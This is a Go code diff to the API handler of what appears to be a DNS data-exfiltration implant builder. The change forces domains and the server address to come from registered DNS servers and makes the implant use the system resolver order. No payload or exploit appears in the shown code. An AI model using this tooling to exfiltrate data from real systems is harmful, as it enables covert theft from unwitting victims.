@@ -363,60 +363,27 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 		req.Architecture = "amd64"
 	}
 
-	// Normalize provided lists
-	for i, domain := range req.Domains {
-		req.Domains[i] = strings.TrimSpace(domain)
-	}
-	for i, resolver := range req.Resolvers {
-		req.Resolvers[i] = strings.TrimSpace(resolver)
-	}
-	req.Domains = filterEmpty(req.Domains)
-	req.Resolvers = filterEmpty(req.Resolvers)
-
-	var cachedDNSServers []map[string]interface{}
-	var dnsErr error
-	needServers := len(req.Domains) == 0 || req.ServerIP == ""
-	if needServers {
-		cachedDNSServers, dnsErr = api.db.GetDNSServers()
-		if dnsErr != nil {
-			api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
-			return
-		}
-	}
-
-	// Auto-populate domains from active DNS servers if not provided
-	if len(req.Domains) == 0 {
-		for _, server := range cachedDNSServers {
-			status, _ := server["status"].(string)
-			if status != "active" {
-				continue
-			}
-			if domain, ok := server["domain"].(string); ok && domain != "" {
-				req.Domains = append(req.Domains, domain)
-			}
-		}
-		req.Domains = filterEmpty(req.Domains)
-	}
-
-	if len(req.Domains) == 0 {
-		api.sendError(w, http.StatusBadRequest, "no domains provided and no active DNS servers found")
+	// Always derive DNS configuration from the database to prevent manual overrides
+	cachedDNSServers, dnsErr := api.db.GetDNSServers()
+	if dnsErr != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
 		return
 	}
 
-	// Infer server IP from registered DNS servers if not provided
-	if req.ServerIP == "" {
-		for _, server := range cachedDNSServers {
-			if addr, ok := server["address"].(string); ok && addr != "" {
-				req.ServerIP = addr
-				break
-			}
-		}
-	}
-
-	if req.ServerIP == "" {
-		api.sendError(w, http.StatusBadRequest, "server_ip is required")
+	req.Domains = collectActiveDomains(cachedDNSServers)
+	if len(req.Domains) == 0 {
+		api.sendError(w, http.StatusBadRequest, "no active DNS servers available - build at least one before generating an exfil client")
 		return
 	}
+
+	req.ServerIP = selectServerAddress(cachedDNSServers)
+	if req.ServerIP == "" {
+		api.sendError(w, http.StatusBadRequest, "no DNS server addresses recorded - rebuild a DNS server with a server address before generating an exfil client")
+		return
+	}
+
+	// Force the implant to rely on system resolver order
+	req.Resolvers = nil
 
 	// Apply sensible defaults/constraints
 	if req.ChunkBytes <= 0 {
@@ -1303,6 +1270,53 @@ func filterEmpty(values []string) []string {
 		}
 	}
 	return filtered
+}
+
+func collectActiveDomains(servers []map[string]interface{}) []string {
+	seen := make(map[string]struct{})
+	var domains []string
+	for _, server := range servers {
+		status, _ := server["status"].(string)
+		if status != "active" {
+			continue
+		}
+		if domain, ok := server["domain"].(string); ok {
+			domain = strings.TrimSpace(domain)
+			if domain == "" {
+				continue
+			}
+			if _, exists := seen[domain]; exists {
+				continue
+			}
+			seen[domain] = struct{}{}
+			domains = append(domains, domain)
+		}
+	}
+	return domains
+}
+
+func selectServerAddress(servers []map[string]interface{}) string {
+	pick := func(activeOnly bool) string {
+		for _, server := range servers {
+			if activeOnly {
+				if status, ok := server["status"].(string); !ok || status != "active" {
+					continue
+				}
+			}
+			if addr, ok := server["address"].(string); ok {
+				addr = strings.TrimSpace(addr)
+				if addr != "" {
+					return addr
+				}
+			}
+		}
+		return ""
+	}
+
+	if addr := pick(true); addr != "" {
+		return addr
+	}
+	return pick(false)
 }
 
 type rustTargetConfig struct {
